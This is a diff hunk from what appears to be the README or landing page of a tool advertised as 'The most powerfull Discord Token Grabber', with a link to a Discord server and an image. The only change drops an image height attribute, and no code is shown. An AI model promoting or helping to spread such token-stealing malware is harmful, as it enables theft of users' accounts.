@@ -3,7 +3,7 @@
   <p>The most powerfull Discord Token Grabber</p>
   <a href="https://kanekiweb.tk/discord" target="_blank">Join my Discord Serveur</a><br><br>
 
-  <img src="https://kanekiweb.tk/assets/img/xenos.gif" width="60%" height="380px">
+  <img src="https://kanekiweb.tk/assets/img/xenos.gif" width="60%">
 </div>
 
 <br><br><br>
